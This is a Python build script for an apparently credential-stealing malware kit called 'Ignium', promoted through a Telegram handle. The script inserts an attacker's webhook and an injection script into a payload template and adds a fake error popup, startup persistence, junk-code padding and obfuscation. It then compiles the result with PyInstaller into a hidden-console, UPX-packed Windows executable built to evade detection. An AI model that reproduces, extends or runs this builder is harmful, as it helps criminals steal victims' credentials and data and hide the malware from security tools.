import os, sys, subprocess, shutil, random, string, json, ctypes, socket, requests, fade
from datetime import datetime, timezone
import tables
from utils.payload import ignium_template
from utils.construct import BANNER, Spinner, generate_junk, obfuscate, wrap_in_base64

def build():
    ctypes.windll.kernel32.SetConsoleTitleW("Ignium | t.me/igniumlol")
    os.system('cls' if os.name == 'nt' else 'clear')
    print("\n" * 4)
    try: width = os.get_terminal_size().columns
    except: width = 80
    
    centered_banner = ""
    for line in BANNER.strip('\n').split('\n'):
        centered_banner += line.center(width) + "\n"
    print(fade.purpleblue(centered_banner))
    
    build_id = "#" + "".join(random.choices(string.ascii_lowercase + string.digits, k=8))
    webhook = tables.WEBHOOK
    if not webhook or "YOUR_WEBHOOK_HERE" in webhook:
        bracket_l = fade.purpleblue("[").replace('\n', '')
        bracket_r = fade.purpleblue("]").replace('\n', '')
        print(f"                 {bracket_l}\033[37m!\033[0m{bracket_r} \033[37mWebhook is Required.\033[0m")
        return
        
    fake_error = tables.FAKE_ERROR
    error_msg = tables.ERROR_MESSAGE
    use_icon = tables.USE_ICON
    icon_path = tables.ICON_PATH
    do_obf = tables.OBFUSCATION
    use_junk = tables.JUNK_CODE
    use_upx = tables.UPX
    
    injection_js_content = ""
    inj_path = os.path.join("utils", "build", "injection.js")
    if os.path.exists(inj_path):
        with open(inj_path, "r", encoding='utf-8') as f:
            injection_js_content = f.read()
    
    with Spinner("Preparing Ignium Payload"):
        do_startup = tables.STARTUP
        ignium_code = ignium_template.replace("%WEBHOOK%", webhook).replace("%INJECTION_JS%", repr(injection_js_content)).replace("%DO_INJECT%", "False").replace("%DO_STARTUP%", str(do_startup))
        if fake_error:
            ignium_code += f"\nshow_error({repr(error_msg)})\n"
        ignium_code += "\nsR()\n"
    
        if use_junk:
            ignium_code += generate_junk(size_mb=random.randint(15, 20))
    
        if do_obf:
            ignium_code = obfuscate(ignium_code)
            ignium_code = wrap_in_base64(ignium_code)
    
        with open("ignium.py", "w", encoding='utf-8') as f:
            f.write(ignium_code)

    with Spinner(f"Compiling Build {build_id}"):
        cmd = [
            "pyinstaller", "--onefile", "--noconsole", 
            "--hidden-import=requests", "--hidden-import=sqlite3", 
            "--hidden-import=psutil", 
            "--hidden-import=glob", "--hidden-import=ctypes", "--hidden-import=uuid",
            "--hidden-import=websocket",
            "--hidden-import=cryptography", "--hidden-import=cryptography.hazmat.primitives.ciphers.aead",
            "--hidden-import=Crypto", "--hidden-import=Crypto.Cipher.AES",
            "--exclude-module", "tkinter", "--exclude-module", "tcl", "--exclude-module", "tk",
            "--exclude-module", "matplotlib", "--exclude-module", "numpy", "--exclude-module", "PIL",
            "--exclude-module", "win32crypt",
            "ignium.py"
        ]
    
        if use_icon:
            cmd.extend(["--icon", icon_path])
        
        if use_upx:
            cmd.append("--upx-dir=./upx")
            
        subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    if os.path.exists("dist/ignium.exe"):
        if os.path.exists("Ignium.exe"):
            os.remove("Ignium.exe")
        shutil.move("dist/ignium.exe", "Ignium.exe")
        bracket_l = fade.purpleblue("[").replace('\n', '')
        bracket_r = fade.purpleblue("]").replace('\n', '')
        print(f"                 {bracket_l}\033[37m$\033[0m{bracket_r} \033[37mBuild {build_id} Completed\033[0m")
    else:
        bracket_l = fade.purpleblue("[").replace('\n', '')
        bracket_r = fade.purpleblue("]").replace('\n', '')
        print(f"                 {bracket_l}\033[37m!\033[0m{bracket_r} \033[37mBuild Failed!\033[0m")

    for f in ["ignium.py", "ignium.spec"]:
        if os.path.exists(f): os.remove(f)
    for d in ["build", "dist"]:
        if os.path.exists(d): shutil.rmtree(d)
